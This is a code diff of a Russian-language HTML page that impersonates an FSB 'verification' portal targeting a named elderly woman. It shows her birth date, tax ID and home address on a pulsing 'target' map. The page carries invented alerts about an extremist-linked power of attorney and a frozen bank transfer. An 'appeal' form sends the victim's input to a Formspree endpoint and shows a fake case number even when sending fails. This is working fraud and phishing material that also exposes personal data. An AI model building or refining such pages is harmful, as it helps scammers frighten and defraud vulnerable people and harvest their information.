@@ -14,41 +14,103 @@
     .container { max-width: 800px; width: 100%; padding: 2rem; position: relative; }
 
     .header {
-      text-align: center; margin-bottom: 3rem;
-      border: 1px solid #1e3040; background: #0d1320; padding: 2rem;
+      text-align: center; margin-bottom: 2rem;
+      border: 1px solid #1e3040; background: #0d1320; padding: 1.5rem;
       border-radius: 16px; position: relative; z-index: 2;
       animation: fadeInDown 0.8s ease;
     }
-    .header .icon { font-size: 2.5rem; margin-bottom: 0.5rem; }
+    .header .icon { font-size: 2rem; margin-bottom: 0.3rem; }
     .header h1 {
-      font-size: 1.2rem; font-weight: 600; color: #e0e8f0; letter-spacing: 1px;
+      font-size: 1.1rem; font-weight: 600; color: #e0e8f0; letter-spacing: 1px;
       text-transform: uppercase;
     }
-    .header .subtitle { font-size: 0.85rem; color: #6b7d95; margin-top: 0.5rem; }
+    .header .subtitle { font-size: 0.8rem; color: #6b7d95; margin-top: 0.3rem; }
     .header .badge {
-      display: inline-block; margin-top: 1rem; padding: 0.4rem 1.5rem;
+      display: inline-block; margin-top: 0.8rem; padding: 0.3rem 1.2rem;
       background: #1a0a0f; border: 1px solid #4a1525; color: #f0506a;
-      border-radius: 20px; font-size: 0.8rem; letter-spacing: 2px;
+      border-radius: 20px; font-size: 0.75rem; letter-spacing: 2px;
       animation: pulse 2s infinite;
     }
 
-    .center-node {
-      width: 180px; height: 180px; margin: 0 auto 2rem;
-      border-radius: 50%; background: radial-gradient(circle at center, #1a2540, #0d1320);
-      border: 3px solid #c41230; display: flex; flex-direction: column;
-      justify-content: center; align-items: center; text-align: center;
-      position: relative; z-index: 2; box-shadow: 0 0 60px rgba(196, 18, 48, 0.3);
-      animation: float 3s ease-in-out infinite;
+    /* Блок с картой */
+    .map-block {
+      margin: 0 auto 2rem; position: relative; z-index: 2;
+      background: #0d1320; border: 1px solid #1e3040; border-radius: 16px;
+      padding: 1.5rem; text-align: center;
+      animation: fadeInUp 0.8s ease;
     }
-    .center-node .name { font-size: 0.9rem; font-weight: 700; color: #ffffff; line-height: 1.3; }
-    .center-node .id { font-size: 0.7rem; color: #6b7d95; margin-top: 0.3rem; }
+    .map-block .map-title {
+      font-size: 0.8rem; color: #7a8ba6; letter-spacing: 1px;
+      margin-bottom: 1rem; text-transform: uppercase;
+    }
+    .map-container {
+      position: relative; width: 100%; height: 250px;
+      background: #0a1018; border-radius: 12px; overflow: hidden;
+      border: 1px solid #1e3040;
+    }
+    /* Сетка карты */
+    .map-grid {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background-image: 
+        linear-gradient(rgba(30,48,64,0.4) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(30,48,64,0.4) 1px, transparent 1px);
+      background-size: 30px 30px;
+    }
+    /* Дороги */
+    .road {
+      position: absolute; background: rgba(30,48,64,0.6);
+    }
+    .road-h { height: 2px; width: 100%; }
+    .road-v { width: 2px; height: 100%; }
+    .road-1 { top: 30%; }
+    .road-2 { top: 55%; }
+    .road-3 { top: 75%; }
+    .road-4 { left: 25%; }
+    .road-5 { left: 50%; }
+    .road-6 { left: 70%; }
+    /* Кольцевая */
+    .ring {
+      position: absolute; border: 1px solid rgba(30,48,64,0.5); border-radius: 50%;
+    }
+    .ring-1 { width: 180px; height: 180px; top: 35px; left: calc(50% - 90px); }
+    .ring-2 { width: 120px; height: 120px; top: 65px; left: calc(50% - 60px); }
+    /* Точка объекта */
+    .target-dot {
+      position: absolute; width: 16px; height: 16px;
+      background: #c41230; border-radius: 50%;
+      top: 40%; left: 55%;
+      box-shadow: 0 0 20px #c41230, 0 0 40px #c41230, 0 0 60px #c41230;
+      animation: targetPulse 1.5s infinite;
+      z-index: 3;
+    }
+    .target-ring {
+      position: absolute; width: 40px; height: 40px;
+      border: 2px solid #c41230; border-radius: 50%;
+      top: calc(40% - 12px); left: calc(55% - 12px);
+      animation: targetExpand 2s infinite;
+      z-index: 2;
+    }
+    .target-ring:nth-child(2) { animation-delay: 0.5s; }
+    .target-ring:nth-child(3) { animation-delay: 1s; }
+    /* Координаты */
+    .coordinates {
+      position: absolute; bottom: 10px; right: 15px;
+      font-size: 0.65rem; color: #4a5a70; letter-spacing: 0.5px;
+      background: #0a1018; padding: 0.3rem 0.6rem; border-radius: 6px;
+      border: 1px solid #1e3040;
+    }
+    .coord-dot {
+      position: absolute; bottom: 50px; right: 20px;
+      font-size: 0.65rem; color: #c41230; letter-spacing: 0.5px;
+      animation: fadeInUp 1s ease;
+    }
 
     .arrow-down { display: flex; justify-content: center; margin: 0.5rem 0; animation: bounce 2s infinite; }
     .arrow-down span { font-size: 2rem; color: #c41230; }
 
     .action-card {
       background: #0d1320; border: 1px solid #1e3040; border-radius: 12px;
-      padding: 1.2rem; margin-bottom: 1rem; position: relative; z-index: 2;
+      padding: 1rem; margin-bottom: 0.8rem; position: relative; z-index: 2;
       transition: all 0.3s ease; animation: fadeInUp 0.6s ease both;
     }
     .action-card:nth-child(1) { animation-delay: 0.2s; }
@@ -62,108 +124,107 @@
     }
     .action-card .card-header {
       display: flex; justify-content: space-between; align-items: center;
-      margin-bottom: 0.5rem;
+      margin-bottom: 0.4rem;
     }
-    .action-card .card-title { font-weight: 600; font-size: 0.95rem; color: #e0e8f0; }
+    .action-card .card-title { font-weight: 600; font-size: 0.9rem; color: #e0e8f0; }
     .action-card .card-badge {
-      padding: 0.2rem 0.8rem; border-radius: 12px; font-size: 0.7rem;
+      padding: 0.2rem 0.6rem; border-radius: 12px; font-size: 0.65rem;
       font-weight: 700; letter-spacing: 1px;
     }
     .badge-danger { background: #1a0a0f; color: #f0506a; border: 1px solid #4a1525; }
     .badge-warning { background: #1a1405; color: #f0c040; border: 1px solid #4a3a15; }
-    .badge-success { background: #0a1a0f; color: #50f070; border: 1px solid #154a25; }
 
-    .action-card .card-detail { font-size: 0.8rem; color: #7a8ba6; line-height: 1.5; }
+    .action-card .card-detail { font-size: 0.78rem; color: #7a8ba6; line-height: 1.4; }
     .action-card .card-detail strong { color: #c0c8d4; }
 
     .blocked-action {
-      margin-top: 2rem; padding: 1.5rem;
+      margin-top: 1.5rem; padding: 1.2rem;
       background: #0d1320; border: 1px solid #1e3040; border-radius: 12px;
       text-align: center; position: relative; z-index: 2;
       animation: fadeInUp 0.6s ease both; animation-delay: 1s;
       opacity: 0.6; cursor: not-allowed;
     }
-    .blocked-action .lock-icon { font-size: 2rem; margin-bottom: 0.5rem; }
+    .blocked-action .lock-icon { font-size: 1.5rem; margin-bottom: 0.3rem; }
     .blocked-action .action-title {
-      font-size: 1rem; font-weight: 600; color: #6b7d95;
-      text-decoration: line-through; margin-bottom: 0.5rem;
+      font-size: 0.9rem; font-weight: 600; color: #6b7d95;
+      text-decoration: line-through; margin-bottom: 0.3rem;
     }
     .blocked-action .action-hint {
-      font-size: 0.75rem; color: #4a5a70;
-      background: #111a2b; display: inline-block; padding: 0.4rem 1rem;
+      font-size: 0.7rem; color: #4a5a70;
+      background: #111a2b; display: inline-block; padding: 0.3rem 0.8rem;
       border-radius: 12px; border: 1px solid #2a3a50;
     }
 
     .appeal-form {
-      margin-top: 2rem; padding: 1.5rem;
+      margin-top: 1.5rem; padding: 1.2rem;
       background: #0d1320; border: 1px solid #2a3a5c; border-radius: 12px;
       position: relative; z-index: 2;
       animation: fadeInUp 0.6s ease both; animation-delay: 1.2s;
     }
     .appeal-form h3 {
-      font-size: 1rem; color: #e0e8f0; margin-bottom: 1rem;
+      font-size: 0.9rem; color: #e0e8f0; margin-bottom: 0.8rem;
       text-align: center; letter-spacing: 1px;
     }
-    .form-group { margin-bottom: 1rem; }
+    .form-group { margin-bottom: 0.8rem; }
     .form-group label {
-      display: block; font-size: 0.8rem; color: #7a8ba6; margin-bottom: 0.4rem;
-      letter-spacing: 0.5px;
+      display: block; font-size: 0.75rem; color: #7a8ba6; margin-bottom: 0.3rem;
     }
     .form-group input, .form-group textarea {
-      width: 100%; padding: 0.7rem 1rem;
-      background: #111a2b; border: 1px solid #2a3a50; border-radius: 8px;
-      color: #c0c8d4; font-size: 0.9rem; font-family: inherit;
-      transition: border 0.3s;
+      width: 100%; padding: 0.6rem 0.8rem;
+      background: #111a2b; border: 1px solid #2a3a50; border-radius: 6px;
+      color: #c0c8d4; font-size: 0.85rem; font-family: inherit;
     }
     .form-group input:focus, .form-group textarea:focus {
       outline: none; border-color: #c41230;
     }
-    .form-group textarea { resize: vertical; min-height: 80px; }
+    .form-group textarea { resize: vertical; min-height: 70px; }
     .submit-btn {
-      width: 100%; padding: 0.8rem;
+      width: 100%; padding: 0.7rem;
       background: #1a0a0f; border: 1px solid #c41230; color: #f0506a;
-      font-size: 0.9rem; font-weight: 600; letter-spacing: 1px;
-      border-radius: 8px; cursor: pointer; transition: all 0.3s;
-      text-transform: uppercase;
+      font-size: 0.85rem; font-weight: 600; letter-spacing: 1px;
+      border-radius: 6px; cursor: pointer; transition: all 0.3s;
     }
     .submit-btn:hover { background: #2a1520; }
     .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
 
     .response-box {
-      margin-top: 1rem; padding: 1rem;
-      background: #111a2b; border: 1px solid #2a3a50; border-radius: 8px;
+      margin-top: 0.8rem; padding: 0.8rem;
+      background: #111a2b; border: 1px solid #2a3a50; border-radius: 6px;
       display: none; text-align: center;
     }
     .response-box.success { display: block; border-color: #154a25; }
     .response-box .response-number {
-      font-size: 1.5rem; font-weight: 700; color: #50f070;
-      letter-spacing: 2px; margin: 0.5rem 0;
+      font-size: 1.3rem; font-weight: 700; color: #50f070;
+      letter-spacing: 2px; margin: 0.3rem 0;
     }
-    .response-box .response-status {
-      font-size: 0.8rem; color: #f0c040;
-    }
+    .response-box .response-status { font-size: 0.75rem; color: #f0c040; }
 
     .connector-line {
-      width: 2px; height: 30px; background: linear-gradient(to bottom, #c41230, transparent);
+      width: 2px; height: 20px; background: linear-gradient(to bottom, #c41230, transparent);
       margin: 0 auto;
     }
 
     .footer {
-      text-align: center; margin-top: 3rem; padding-top: 1.5rem;
-      border-top: 1px solid #1e3040; color: #4a5a70; font-size: 0.7rem;
+      text-align: center; margin-top: 2rem; padding-top: 1rem;
+      border-top: 1px solid #1e3040; color: #4a5a70; font-size: 0.65rem;
     }
 
+    /* Анимации */
     @keyframes fadeInDown {
-      from { opacity: 0; transform: translateY(-20px); }
+      from { opacity: 0; transform: translateY(-15px); }
       to { opacity: 1; transform: translateY(0); }
     }
     @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
+      from { opacity: 0; transform: translateY(15px); }
       to { opacity: 1; transform: translateY(0); }
     }
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
+    @keyframes targetPulse {
+      0%, 100% { box-shadow: 0 0 10px #c41230, 0 0 20px #c41230; }
+      50% { box-shadow: 0 0 30px #c41230, 0 0 60px #c41230, 0 0 90px #c41230; }
+    }
+    @keyframes targetExpand {
+      0% { transform: scale(1); opacity: 0.8; }
+      100% { transform: scale(3); opacity: 0; }
     }
     @keyframes pulse {
       0%, 100% { opacity: 1; }
@@ -171,7 +232,7 @@
     }
     @keyframes bounce {
       0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(8px); }
+      50% { transform: translateY(6px); }
     }
   </style>
 </head>
@@ -186,10 +247,26 @@
       <div class="badge">⚠ ОБЪЕКТ ПРОВЕРКИ</div>
     </div>
 
-    <!-- Центральный узел — клиент -->
-    <div class="center-node">
-      <span class="name">Рудакова<br>Людмила<br>Александровна</span>
-      <span class="id">27.04.1955 · ИНН 771500123456</span>
+    <!-- Карта -->
+    <div class="map-block">
+      <div class="map-title">📍 Геолокация объекта проверки · Москва</div>
+      <div class="map-container">
+        <div class="map-grid"></div>
+        <div class="road road-h road-1"></div>
+        <div class="road road-h road-2"></div>
+        <div class="road road-h road-3"></div>
+        <div class="road road-v road-4"></div>
+        <div class="road road-v road-5"></div>
+        <div class="road road-v road-6"></div>
+        <div class="ring ring-1"></div>
+        <div class="ring ring-2"></div>
+        <div class="target-dot"></div>
+        <div class="target-ring"></div>
+        <div class="target-ring"></div>
+        <div class="target-ring"></div>
+        <div class="coord-dot">📍 55.7558° N, 37.6173° E</div>
+        <div class="coordinates">ул. Дубкинская, д. 4, кв. 108 · Москва</div>
+      </div>
     </div>
 
     <div class="arrow-down"><span>▼</span></div>
@@ -221,7 +298,7 @@
         <span class="card-badge badge-danger">Активна</span>
       </div>
       <div class="card-detail">
-        Оформлена <strong>генеральная доверенность</strong> на имя Терновского Романа Леонидовича (лицо из списка экстремистов). Документ заверен сотрудником коммерческого банка.
+        Оформлена <strong>генеральная доверенность</strong> на имя Терновского Романа Леонидовича (лицо из списка экстремистов).
       </div>
     </div>
 
@@ -231,7 +308,7 @@
         <span class="card-badge badge-warning">Приостановлен</span>
       </div>
       <div class="card-detail">
-        Со счёта в <strong>Альфа-банке</strong> инициирован перевод <strong>500 000 руб.</strong> в адрес Терновского Р.Л. Операция приостановлена Росфинмониторингом. Ранее на счёт поступили <strong>950 000 руб.</strong> от Лаптуховой Е.А.
+        Со счёта в <strong>Альфа-банке</strong> инициирован перевод <strong>500 000 руб.</strong> в адрес Терновского Р.Л. Ранее на счёт поступили <strong>950 000 руб.</strong> от Лаптуховой Е.А.
       </div>
     </div>
 
@@ -241,7 +318,7 @@
       <div class="action-hint">⏳ Ожидается завершение проверки ФСБ</div>
     </div>
 
-    <!-- Форма обращения в ФСБ -->
+    <!-- Форма -->
     <div class="appeal-form" id="appealForm">
       <h3>📩 Обращение в ФСБ</h3>
       <form id="fsbForm">
@@ -283,7 +360,6 @@
       const randomNum = 'ФСБ-' + Math.floor(Math.random() * 900000 + 100000) + '-' + Math.floor(Math.random() * 90 + 10);
       document.getElementById('responseNumber').textContent = randomNum;
 
-      // Отправка в Formspree
       const formData = new FormData(this);
       try {
         await fetch('https://formspree.io/f/maqzpror', {
@@ -291,9 +367,7 @@
           body: formData,
           headers: { 'Accept': 'application/json' }
         });
-      } catch (e) {
-        // Всё равно показываем успех
-      }
+      } catch (e) {}
 
       document.getElementById('responseBox').classList.add('success');
       btn.textContent = 'Отправлено';
